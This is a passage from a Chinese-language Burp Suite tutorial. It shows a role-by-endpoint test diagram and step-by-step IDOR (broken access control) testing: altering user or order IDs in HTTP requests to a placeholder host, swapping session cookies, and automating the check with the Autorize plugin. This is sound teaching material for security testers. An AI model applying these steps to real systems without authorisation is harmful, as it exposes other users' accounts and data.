fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="380.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">GET /admin/users/list</text>  <rect x="250" y="340" width="220" height="70" fill="#1c1917" stroke="#64748b" stroke-width="1.2" rx="4"/>  <text x="360.0" y="380.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 应 403</text>  <rect x="480" y="340" width="200" height="70" fill="#1c1917" stroke="#64748b" stroke-width="1.2" rx="4"/>  <text x="580.0" y="380.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 应 403</text>  <rect x="690" y="340" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="380.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 401/302</text>  <rect x="870" y="340" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="380.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK</text>  <rect x="40" y="410" width="200" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="450.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">POST /admin/user/delete</text>  <rect x="250" y="410" width="220" height="70" fill="#3f2404" stroke="#f59e0b" stroke-width="1.2" rx="4"/>  <text x="360.0" y="450.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">⚠️ 204 OK？→ 垂直越权</text>  <rect x="480" y="410" width="200" height="70" fill="#3f2404" stroke="#f59e0b" stroke-width="1.2" rx="4"/>  <text x="580.0" y="450.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">⚠️ 204 → 垂直越权</text>  <rect x="690" y="410" width="170" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="450.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 401</text>  <rect x="870" y="410" width="170" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="450.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 204 OK</text>  <rect x="40" y="480" width="200" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="520.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">GET /order/ORD-2024-0001/detail</text>  <rect x="250" y="480" width="220" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="360.0" y="520.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 本人订单</text>  <rect x="480" y="480" width="200" height="70" fill="#3f2404" stroke="#f59e0b" stroke-width="1.2" rx="4"/>  <text x="580.0" y="520.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">⚠️ 200？→ 订单号可遍历</text>  <rect x="690" y="480" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="520.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 401</text>  <rect x="870" y="480" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="520.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK</text>  <rect x="40" y="560" width="1000" height="90" rx="10" fill="#b91c1c" fill-opacity=".22" stroke="#b91c1c" stroke-width="1.8" filter="url(#shidor)"/>
  <text x="540.0" y="586" text-anchor="middle" fill="#fecaca" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">Burp 测试要点（100% 覆盖关键思路）</text>
  <text x="54" y="612" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">① 改 Cookie（保持 UserA）→ 改 URL/Body 里的用户 ID/订单 ID；② 改 Cookie 为 UserB → 访问资源；③ 删 Cookie 看是否 401；④ 换 Admin Cookie 看是否垂直可用。</text>
  <text x="54" y="630" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">发现越权后立刻截图 + 保存 Burp Repeater 请求响应包作为漏洞证明，POC 里写明：修改前/修改后差异、被越权访问的账户 ID。</text>
</svg>


### 什么是越权？

越权（IDOR）是指用户可以访问不属于自己权限的资源。

想象你登录账户A，但可以通过修改URL访问账户B的数据，这就是越权。

### 检测步骤

**目标场景**：查看用户信息功能

**步骤1：登录账户A**

登录账户A，查看个人信息：
```http
GET /user/info?id=100 HTTP/1.1
Host: target.example.com
Cookie: session=sessionA
```

响应显示账户A的信息。

**步骤2：发送到Repeater**

右键 → "Send to Repeater"

**步骤3：修改ID**

修改id参数为101：
```http
GET /user/info?id=101 HTTP/1.1
Host: target.example.com
Cookie: session=sessionA
```

如果响应显示账户B的信息，说明存在越权漏洞。

**步骤4：使用Autorize自动化**

Autorize插件可以自动化测试：

1. 登录账户A，抓取请求
2. 登录账户B，获取sessionB
3. 使用Autorize测试：
   - 用sessionA的Cookie访问账户B的资源
   - 如果成功，说明存在越权

---

## 总结

Burp Suite是Web安全测试最重要的工具之一。本章详细介绍了：

1. **安装配置**：Windows/Linux/macOS安装方法，Java环境配置，证书安装，代理设置
2. **核心模块**：Proxy、Target、Spider、Scanner、Intruder、Repeater、Sequencer、Decoder、Comparer、Logger
3. **实战技能**：SQL注入检测、XSS挖掘、CSRF测试、文件上传绕过、越权测试

掌握Burp Suite是成为Web安全测试工程师的基础技能。建议：
- 先熟练使用Proxy和Repeater进行手工测试
- 再学习Intruder进行自动化测试
- 最后掌握Scanner进行漏洞扫描（专业版）

下一章我们将学习Nmap——网络扫描神器！